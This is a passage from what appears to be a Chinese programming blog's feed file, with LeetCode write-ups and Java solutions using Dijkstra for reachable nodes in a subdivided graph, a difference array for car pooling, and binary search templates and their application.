。</p><p>现在得到一个&nbsp;<strong>新的细分图</strong> ，请你计算从节点 <code>0</code> 出发，可以到达多少个节点？如果节点间距离是 <code>maxMoves</code> 或更少，则视为 <strong>可以到达</strong> 。</p><p>给你原始图和 <code>maxMoves</code> ，返回 <em>新的细分图中从节点 <code>0</code> 出发</em><strong><em> 可到达的节点数</em></strong>&nbsp;。</p><p><strong>示例 1：</strong></p><img alt="" src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/08/01/origfinal.png" class="lazyload" data-srcset="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/08/01/origfinal.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="height: 247px; width: 600px;"><pre><strong>输入：</strong>edges = [[0,1,10],[0,2,1],[1,2,2]], maxMoves = 6, n = 3<strong>输出：</strong>13<strong>解释：</strong>边的细分情况如上图所示。可以到达的节点已经用黄色标注出来。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>edges = [[0,1,4],[1,2,6],[0,2,8],[1,3,1]], maxMoves = 10, n = 4<strong>输出：</strong>23</pre><p><strong>示例 3：</strong></p><pre><strong>输入：</strong>edges = [[1,2,4],[1,4,5],[1,3,1],[2,3,4],[3,4,5]], maxMoves = 17, n = 5<strong>输出：</strong>1<strong>解释：</strong>节点 0 与图的其余部分没有连通，所以只有节点 0 可以到达。</pre><p><strong>提示：</strong></p><ul>    <li><code>0 &lt;= edges.length &lt;= min(n * (n - 1) / 2, 10<sup>4</sup>)</code></li>    <li><code>edges[i].length == 3</code></li>    <li><code>0 &lt;= u<sub>i</sub> &lt; v<sub>i</sub> &lt; n</code></li>    <li>图中 <strong>不存在平行边</strong></li>    <li><code>0 &lt;= cnt<sub>i</sub> &lt;= 10<sup>4</sup></code></li>    <li><code>0 &lt;= maxMoves &lt;= 10<sup>9</sup></code></li>    <li><code>1 &lt;= n &lt;= 3000</code></li></ul></div><ol><li><p>思路</p><blockquote><p>这是最短路径的变种题，在求不超过阈值的范围内的最短路径，还要新加一层判断不能到的地方还能多走几步</p></blockquote></li><li><p>解题方法</p><blockquote><p>核心算法dijkstra不需要变，但是需要改变一下题目所给的权重，因为权重仅包含中间出现的节点，未包含上一个图的节点，所以初始化图的时候 <code>w</code> 需要 +1。</p></blockquote></li></ol><p>然后核心的关键在于求所有的节点：所有的总数 &#x3D; maxMoves步数内能到达的点的个数 + 中间的还有几个节点可以走</p><ol start="3"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reachableNodes</span><span class="params">(<span class="type">int</span>[][] edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">// 求最短路径的变种题，新加一层判断不能到的地方还能多走几步</span></span><br><span class="line">        List&lt;<span class="type">int</span>[]&gt;[] graph = <span class="keyword">new</span> <span class="title class_">LinkedList</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            graph[i] = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>] + <span class="number">1</span>; <span class="comment">// +1 代表中间的节点数加上上一个位置的节点</span></span><br><span class="line">            graph[from].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;to, w&#125;);</span><br><span class="line">            graph[to].add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;from, w&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dist = dijkstra(graph, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 先求maxMoves步数内能到达的点的个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dist[i] &lt;= maxMoves) &#123;</span><br><span class="line">                ans ++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ** 再求中间的还有几个节点可以走</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> edge[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> edge[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> edge[<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Math.max(maxMoves - dist[from], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Math.max(maxMoves - dist[to], <span class="number">0</span>);</span><br><span class="line">            ans += Math.min(a + b, w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] dijkstra(List&lt;<span class="type">int</span>[]&gt;[] graph, <span class="type">int</span> start) &#123;</span><br><span class="line">        <span class="type">int</span>[] dist = <span class="keyword">new</span> <span class="title class_">int</span>[graph.length];</span><br><span class="line">        Arrays.fill(dist, Integer.MAX_VALUE);</span><br><span class="line">        Queue&lt;State&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((a, b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a.dis - b.dis;</span><br><span class="line">        &#125;);</span><br><span class="line">        dist[start] = <span class="number">0</span>;</span><br><span class="line">        pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(start, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">while</span>(!pq.isEmpty()) &#123;</span><br><span class="line">            <span class="type">State</span> <span class="variable">cur</span> <span class="operator">=</span> pq.poll();</span><br><span class="line">            <span class="type">int</span> <span class="variable">curId</span> <span class="operator">=</span> cur.id;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curW</span> <span class="operator">=</span> cur.dis;</span><br><span class="line">            <span class="keyword">if</span> (curW &gt; dist[curId]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span>[] neighbor: graph[curId]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextId</span> <span class="operator">=</span> neighbor[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">nextW</span> <span class="operator">=</span> neighbor[<span class="number">1</span>] + curW;</span><br><span class="line">                <span class="keyword">if</span> (dist[nextId] &gt; nextW) &#123;</span><br><span class="line">                    dist[nextId] = nextW;</span><br><span class="line">                    pq.offer(<span class="keyword">new</span> <span class="title class_">State</span>(nextId, nextW));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dist;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">State</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> dis;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">State</span><span class="params">(<span class="type">int</span> _id, <span class="type">int</span> _dis)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = _id;</span><br><span class="line">        <span class="built_in">this</span>.dis = _dis;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 最短路径 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>差分数组，解频繁增减的求和问题</title>
      <link href="/2023/11/18/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%EF%BC%8C%E8%A7%A3%E9%A2%91%E7%B9%81%E5%A2%9E%E5%87%8F%E7%9A%84%E6%B1%82%E5%92%8C%E9%97%AE%E9%A2%98/"/>
      <url>/2023/11/18/%E5%B7%AE%E5%88%86%E6%95%B0%E7%BB%84%EF%BC%8C%E8%A7%A3%E9%A2%91%E7%B9%81%E5%A2%9E%E5%87%8F%E7%9A%84%E6%B1%82%E5%92%8C%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>当题目给出的数据不是很大，需要快速求解数组区间的和，并且频繁的对数组内的值增加和减掉，可以考虑用差分数组来实现快速求区间值。</p><span id="more"></span><h5 id="1094-拼车"><a href="#1094-拼车" class="headerlink" title="1094.拼车"></a>1094.拼车</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/car-pooling/description/">1094. 拼车</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>车上最初有&nbsp;<code>capacity</code>&nbsp;个空座位。车&nbsp;<strong>只能&nbsp;</strong>向一个方向行驶（也就是说，<strong>不允许掉头或改变方向</strong>）</p><p>给定整数&nbsp;<code>capacity</code>&nbsp;和一个数组 <code>trips</code> , &nbsp;<code>trip[i] = [numPassengers<sub>i</sub>, from<sub>i</sub>, to<sub>i</sub>]</code>&nbsp;表示第 <code>i</code> 次旅行有&nbsp;<code>numPassengers<sub>i</sub></code>&nbsp;乘客，接他们和放他们的位置分别是&nbsp;<code>from<sub>i</sub></code>&nbsp;和&nbsp;<code>to<sub>i</sub></code>&nbsp;。这些位置是从汽车的初始位置向东的公里数。</p><p>当且仅当你可以在所有给定的行程中接送所有乘客时，返回&nbsp;<code>true</code>，否则请返回 <code>false</code>。</p><p><strong>示例 1：</strong></p><pre><strong>输入：</strong>trips = [[2,1,5],[3,3,7]], capacity = 4<strong>输出：</strong>false</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>trips = [[2,1,5],[3,3,7]], capacity = 5<strong>输出：</strong>true</pre><p><strong>提示：</strong></p><ul>    <li><code>1 &lt;= trips.length &lt;= 1000</code></li>    <li><code>trips[i].length == 3</code></li>    <li><code>1 &lt;= numPassengers<sub>i</sub>&nbsp;&lt;= 100</code></li>    <li><code>0 &lt;= from<sub>i</sub>&nbsp;&lt; to<sub>i</sub>&nbsp;&lt;= 1000</code></li>    <li><code>1 &lt;= capacity &lt;= 10<sup>5</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>题目给出的数据不是很大，然后需要频繁对车站人数上车和下车，即频繁的增加和减掉，可以考虑用差分数组来实现。</p></blockquote></li><li><p>解题方法</p><blockquote><p>差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车， 求出每个站在车上的人数，然后再循环比对每个车站的人数，如果超过限制人数，直接返回false。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p></li></ul></li></ol><blockquote><p>$O(n)$</p></blockquote><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">carPooling</span><span class="params">(<span class="type">int</span>[][] trips, <span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="comment">// 差分数组，题目给出车站从0-1000，那么只需计算经过每个站车上的人数，不需要管需不需要下车</span></span><br><span class="line">        <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] trip: trips) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> trip[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">from</span> <span class="operator">=</span> trip[<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">to</span> <span class="operator">=</span> trip[<span class="number">2</span>] - <span class="number">1</span>; <span class="comment">// 比如第0站坐到第2个站，那么还在车上为0，1</span></span><br><span class="line">            <span class="comment">// 给 from 到 to - 1 的都加 p</span></span><br><span class="line">            nums[from] += p;</span><br><span class="line">            <span class="keyword">if</span> (to + <span class="number">1</span> &lt; <span class="number">1001</span>) &#123;</span><br><span class="line">                nums[to + <span class="number">1</span>] -= p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="comment">// 将差分数组转化为原数据</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>];</span><br><span class="line">        res[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; <span class="number">1001</span>; j++) &#123;</span><br><span class="line">            res[j] = res[j - <span class="number">1</span>] + nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 然后判断每个站的车上人数是否超载</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; <span class="number">1001</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (res[k] &gt; capacity) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 差分数组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二分查找，找目标值（或边界）问题</title>
      <link href="/2023/11/18/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%EF%BC%8C%E6%89%BE%E7%9B%AE%E6%A0%87%E5%80%BC%EF%BC%88%E6%88%96%E8%BE%B9%E7%95%8C%EF%BC%89%E9%97%AE%E9%A2%98/"/>
      <url>/2023/11/18/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%EF%BC%8C%E6%89%BE%E7%9B%AE%E6%A0%87%E5%80%BC%EF%BC%88%E6%88%96%E8%BE%B9%E7%95%8C%EF%BC%89%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>二分查找包括求查找中间值和左右边界值三种情况。</p><span id="more"></span><h5 id="二分查找（左右指针）模板"><a href="#二分查找（左右指针）模板" class="headerlink" title="二分查找（左右指针）模板"></a>二分查找（左右指针）模板</h5><p>左右指针即为最开始，左指针<code>left</code>在数组的最开始位置，右指针<code>right</code>在数组的末尾，然后循环时在判断左右指针什么时候开始相向移动，直至<code>left == right</code>左右指针相遇。</p><p>常见题目：二分查找，求两数之和、反转数组等。</p><p>重点为<code>二分查找</code>，二分查找的数组可能包含重复值，重复值的寻找条件可能包含第一寻找到相同元素返回、寻找指定元素的最左边界位置、寻找指定元素的最右边界位置等三种情况。三种边界的区别在于，寻找到指定元素后是否需要第一时间返回位置值，即<code>nums[mid]==target</code>时的操作不同，可见下列算法。</p><p>算法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binary_search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 直接返回</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接返回</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">left_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定左侧边界</span></span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; <span class="number">0</span> || left &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断一下 nums[left] 是不是 target</span></span><br><span class="line">    <span class="keyword">return</span> nums[left] == target ? left : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">right_bound</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">            <span class="comment">// 别返回，锁定右侧边界</span></span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断 target 是否存在于 nums 中</span></span><br><span class="line">    <span class="comment">// if (left - 1 &lt; 0 || left - 1 &gt;= nums.length) &#123;</span></span><br><span class="line">    <span class="comment">//     return -1;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于 while 的结束条件是 right == left - 1，且现在在求右边界</span></span><br><span class="line">    <span class="comment">// 所以用 right 替代 left - 1 更好记</span></span><br><span class="line">    <span class="keyword">if</span> (right &lt; <span class="number">0</span> || right &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[right] == target ? right : -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2300-咒语和药水的成功对数（中等）"><a href="#2300-咒语和药水的成功对数（中等）" class="headerlink" title="2300.咒语和药水的成功对数（中等）"></a>2300.咒语和药水的成功对数（中等）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/successful-pairs-of-spells-and-potions/description/">2300. 咒语和药水的成功对数</a></p></blockquote> <div class="elfjS" data-track-load="description_content"><p>给你两个正整数数组&nbsp;<code>spells</code> 和&nbsp;<code>potions</code>&nbsp;，长度分别为&nbsp;<code>n</code> 和&nbsp;<code>m</code>&nbsp;，其中&nbsp;<code>spells[i]</code>&nbsp;表示第&nbsp;<code>i</code>&nbsp;个咒语的能量强度，<code>potions[j]</code>&nbsp;表示第&nbsp;<code>j</code>&nbsp;瓶药水的能量强度。</p><p>同时给你一个整数&nbsp;<code>success</code>&nbsp;。一个咒语和药水的能量强度 <strong>相乘</strong> 如果&nbsp;<strong>大于等于</strong>&nbsp;<code>success</code>&nbsp;，那么它们视为一对&nbsp;<strong>成功</strong>&nbsp;的组合。</p><p>请你返回一个长度为 <code>n</code>&nbsp;的整数数组<em>&nbsp;</em><code>pairs</code>，其中<em>&nbsp;</em><code>pairs[i]</code>&nbsp;是能跟第 <code>i</code>&nbsp;个咒语成功组合的 <b>药水</b>&nbsp;数目。</p><p><strong>示例 1：</strong></p><pre><b>输入：</b>spells = [5,1,3], potions = [1,2,3,4,5], success = 7<b>输出：</b>[4,0,3]<strong>解释：</strong>- 第 0 个咒语：5 * [1,2,3,4,5] = [5,<em><strong>10</strong></em>,<em><strong>15</strong></em>,<em><strong>20</strong></em>,<em><strong>25</strong></em>] 。总共 4 个成功组合。- 第 1 个咒语：1 * [1,2,3,4,5] = [1,2,3,4,5] 。总共 0 个成功组合。- 第 2 个咒语：3 * [1,2,3,4,5] = [3,6,<em><strong>9</strong></em>,<em><strong>12</strong></em>,<em><strong>15</strong></em>] 。总共 3 个成功组合。所以返回 [4,0,3] 。</pre><p><strong>示例 2：</strong></p><pre><b>输入：</b>spells = [3,1,2], potions = [8,5,8], success = 16<b>输出：</b>[2,0,2]<strong>解释：</strong>- 第 0 个咒语：3 * [8,5,8] = [<em><strong>24</strong></em>,15,<em><strong>24</strong></em>] 。总共 2 个成功组合。- 第 1 个咒语：1 * [8,5,8] = [8,5,8] 。总共 0 个成功组合。- 第 2 个咒语：2 * [8,5,8] = [<em><strong>16</strong></em>,10,<em><strong>16</strong></em>] 。总共 2 个成功组合。所以返回 [2,0,2] 。</pre><p><strong>提示：</strong></p><ul>    <li><code>n == spells.length</code></li>    <li><code>m == potions.length</code></li>    <li><code>1 &lt;= n, m &lt;= 10<sup>5</sup></code></li>    <li><code>1 &lt;= spells[i], potions[i] &lt;= 10<sup>5</sup></code></li>    <li><code>1 &lt;= success &lt;= 10<sup>10</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>刚看的时候想到暴力A，但是第52个用例开始超时，所以改用二分法，找到排序后的药水最左边满足条件的下标，n - left 为第 i 个魔法成功的对数。</p></blockquote></li><li><p>解题方法</p><blockquote><p>对药水进行递增排序，然后二分查找满足 success 的药水下标。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:（不算sort）</p><blockquote><p>$O(mlogn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p> $O(n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] successfulPairs(<span class="type">int</span>[] spells, <span class="type">int</span>[] potions, <span class="type">long</span> success) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> spells.length, n = potions.length;</span><br><span class="line">         Arrays.sort(potions);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(l &lt;= r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + (r - l) / <span class="number">2</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">check</span> <span class="operator">=</span> (<span class="type">long</span>)spells[i] * (<span class="type">long</span>)potions[mid];</span><br><span class="line">                <span class="keyword">if</span> (check &lt; success) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = n - l;</span><br><span class="line"></span><br><span 